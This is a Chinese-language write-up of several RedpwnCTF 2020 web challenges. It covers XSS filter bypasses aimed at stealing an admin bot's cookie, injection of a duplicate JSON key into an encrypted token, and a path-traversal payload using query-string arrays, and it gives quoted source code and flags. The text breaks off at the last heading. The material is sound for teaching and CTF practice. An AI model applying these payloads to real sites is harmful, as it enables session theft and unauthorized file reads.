# RedpwnCTF 2020 Web Writeup
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
> 国外的一场比赛，好多题没写出来，赛后这几天从github上下了dockerfile
> 复现学习一下。web题很新颖，基本上都是nodejs写成，且除几个题外都给了源码，收获满满。  
>  ps. 复现的时候官方环境还没关
>
> 
## web/static-pastebin
> I wanted to make a website to store bits of text, but I don’t have any
> experience with web development. However, I realized that I don’t need any!
> If you experience any issues, make a paste and send it [here](https://admin-> bot.redpwnc.tf/submit?challenge=static-pastebin)
>
> Site: [static-pastebin.2020.redpwnc.tf](https://static-> pastebin.2020.redpwnc.tf/)
>
> Note: The site is entirely static. Dirbuster will not be useful in solving
> it.
题目描述给了两个网址，一个类似代码高亮的纯静态页，一个提交网址xssbot会访问的网站，可以初步判断为xss打cookie
纯静态页面的话可以分析下js是这么过滤的
    (async () => {
        await new Promise((resolve) => {
            window.addEventListener('load', resolve);
        });
        const content = window.location.hash.substring(1);
        display(atob(content));
    })();
    function display(input) {
        document.getElementById('paste').innerHTML = clean(input);
    }
    function clean(input) {
        let brackets = 0;
        let result = '';
        for (let i = 0; i ') {
                brackets --;
            }
        }
        return result
    }
可以看出对`<>`包裹的会被过滤，单是先传入`>`会导致 `brackets=-1`,后面传入`
    // 打cookie
    >
可以用python开一个服务或nc收cookie
## web/panda-facts
> I just found a hate group targeting my favorite animal. Can you try and find
> their secrets? We gotta take them down!
>
> Site: [panda-facts.2020.redpwnc.tf](https://panda-facts.2020.redpwnc.tf/)
输入用户名即可登陆，登陆后提示 You are not a member
给了源码，瞧下源码
    global.__rootdir = __dirname;
    const express = require('express');
    const bodyParser = require('body-parser');
    const cookieParser = require('cookie-parser');
    const path = require('path');
    const crypto = require('crypto');
    require('dotenv').config();
    const INTEGRITY = '12370cc0f387730fb3f273e4d46a94e5';
    const app = express();
    app.use(bodyParser.json({ extended: false }));
    app.use(cookieParser());
    app.post('/api/login', async (req, res) => {
        if (!req.body.username || typeof req.body.username !== 'string') {
            res.status(400);
            res.end();
            return;
        }
        res.json({'token': await generateToken(req.body.username)});
        res.end;
    });
    app.get('/api/validate', async (req, res) => {
        if (!req.cookies.token || typeof req.cookies.token !== 'string') {
            res.json({success: false, error: 'Invalid token'});
            res.end();
            return;
        }
        const result = await decodeToken(req.cookies.token);
        if (!result) {
            res.json({success: false, error: 'Invalid token'});
            res.end();
            return;
        }
        res.json({success: true, token: result});
    });
    app.get('/api/flag', async (req, res) => {
        if (!req.cookies.token || typeof req.cookies.token !== 'string') {
            res.json({success: false, error: 'Invalid token'});
            res.end();
            return;
        }
        const result = await decodeToken(req.cookies.token);
        if (!result) {
            res.json({success: false, error: 'Invalid token'});
            res.end();
            return;
        }
        if (!result.member) {
            res.json({success: false, error: 'You are not a member'});
            res.end();
            return;
        }
        res.json({success: true, flag: process.env.FLAG});
    });
    app.use(express.static(path.join(__dirname, '/public')));
    app.listen(process.env.PORT || 3000);
    async function generateToken(username) {
        const algorithm = 'aes-192-cbc'; 
        const key = Buffer.from(process.env.KEY, 'hex'); 
        // Predictable IV doesn't matter here
        const iv = Buffer.alloc(16, 0);
        const cipher = crypto.createCipheriv(algorithm, key, iv);
        const token = `{"integrity":"${INTEGRITY}","member":0,"username":"${username}"}`
        let encrypted = '';
        encrypted += cipher.update(token, 'utf8', 'base64');
        encrypted += cipher.final('base64');
        return encrypted;
    }
    async function decodeToken(encrypted) {
        const algorithm = 'aes-192-cbc'; 
        const key = Buffer.from(process.env.KEY, 'hex'); 
        // Predictable IV doesn't matter here
        const iv = Buffer.alloc(16, 0);
        const decipher = crypto.createDecipheriv(algorithm, key, iv);
        let decrypted = '';
        try {
            decrypted += decipher.update(encrypted, 'base64', 'utf8');
            decrypted += decipher.final('utf8');
        } catch (error) {
            return false;
        }
        let res;
        try {
            res = JSON.parse(decrypted);
        } catch (error) {
            console.log(error);
            return false;
        }
        if (res.integrity !== INTEGRITY) {
            return false;
        }
        return res;
    }
关注到这一行
    const token = `{"integrity":"${INTEGRITY}","member":0,"username":"${username}"}`
把member伪造成1应该可以得到flag，token aes-192-cbc加密加密生成，也不知道密匙,因为密匙在环境变量中
    const key = Buffer.from(process.env.KEY, 'hex');
引入一个小知识点 JSON parsers会用最后一个值，也就是要是能在后面再构造一个为1的member就能覆盖掉
token哪username可控，尝试注入传入`gg","member":1,"a":"`,最后token变为
`{"integrity":"1","member":0,"username":"gg","member":1,"a":""}` ，flag到手
## web/static-static-hosting
> Seeing that my last website was a success, I made a version where instead of
> storing text, you can make your own custom websites! If you make something
> cool, send it to me [here](https://admin-> bot.redpwnc.tf/submit?challenge=static-static-hosting)
>
> Site: [static-static-hosting.2020.redpwnc.tf](https://static-static-> hosting.2020.redpwnc.tf/)
>
> Note: The site is entirely static. Dirbuster will not be useful in solving
> it.
上面那题xss的升级版，也能看过滤的js代码
    (async () => {
        await new Promise((resolve) => {
            window.addEventListener('load', resolve);
        });
        const content = window.location.hash.substring(1);
        display(atob(content));
    })();
    function display(input) {
        document.documentElement.innerHTML = clean(input);
    }
    function clean(input) {
        const template = document.createElement('template');
        const html = document.createElement('html');
        template.content.appendChild(html);
        html.innerHTML = input;
        sanitize(html);
        const result = html.innerHTML;
        return result;
    }
    function sanitize(element) {
        const attributes = element.getAttributeNames();
        for (let i = 0; i 
和上面一样传过去就有flag了
flag{wh0_n33d5_d0mpur1fy}
ps .在这里用window.location、self、this失败了，猜是不许页面内引入。 除了top还可以用parent代替
## web/tux-fanpage
> My friend made a fanpage for Tux; can you steal the source code for me?
>
> Site: [tux-fanpage.2020.redpwnc.tf](https://tux-fanpage.2020.redpwnc.tf/)
给了源码
    const express = require('express')
    const path = require('path')
    const app = express()
    //Don't forget to redact from published source
    const flag = '[REDACTED]'
    app.get('/', (req, res) => {
        res.redirect('/page?path=index.html')
    })
    app.get('/page', (req, res) => {
        let path = req.query.path
        //Handle queryless request
        if(!path || !strip(path)){
            res.redirect('/page?path=index.html')
            return
        }
        path = strip(path)
        path = preventTraversal(path)
        res.sendFile(prepare(path), (err) => {
            if(err){
                if (! res.headersSent) {
                    try {
                        res.send(strip(req.query.path) + ' not found')
                    } catch {
                        res.end()
                    }
                }
            }
        })
    })
    //Prevent directory traversal attack
    function preventTraversal(dir){
        if(dir.includes('../')){
            let res = dir.replace('../', '')
            return preventTraversal(res)
        }
        //In case people want to test locally on windows
        if(dir.includes('..\')){
            let res = dir.replace('..\', '')
            return preventTraversal(res)
        }
        return dir
    }
    //Get absolute path from relative path
    function prepare(dir){
        return path.resolve('./public/' + dir)
    }
    //Strip leading characters
    function strip(dir){
        const regex = /^[a-z0-9]$/im
        //Remove first character if not alphanumeric
        if(!regex.test(dir[0])){
            if(dir.length > 0){
                return strip(dir.slice(1))
            }
            return ''
        }
        return dir
    }
    app.listen(3000, () => {
        console.log('listening on 0.0.0.0:3000')
    })
要求读文件，但是又很多过滤，一个一个看,首先是这个strip
    //Strip leading characters
    function strip(dir){
        const regex = /^[a-z0-9]$/im
        //Remove first character if not alphanumeric
        if(!regex.test(dir[0])){
            if(dir.length > 0){
                return strip(dir.slice(1))
            }
            return ''
        }
        return dir
    }
传入字符的时候没影响，但是传入数组的时候情况有不同
数组第一个为单个字符就可以过
看preventTraversal()
    function preventTraversal(dir){
        if(dir.includes('../')){
            let res = dir.replace('../', '')
            return preventTraversal(res)
        }
        //In case people want to test locally on windows
        if(dir.includes('..\')){
            let res = dir.replace('..\', '')
            return preventTraversal(res)
        }
        return dir
    }
include 对字符和数组的结果有不同之处
传入数组的话就可以绕过过滤，想办法构造一个`/../../index.js`赋值给path就能读flag。`path.resolve()`，会有一个字符串拼接，如果传入数组，字符串+数组也为字符串。
    payload: ?path[]=a&path[]=/../../index.js
拼接起来是 path=”./public/a,/../../index.js”
flag到手
    const flag = 'flag{tr4v3rsal_Tim3}'
## web/post-it-notes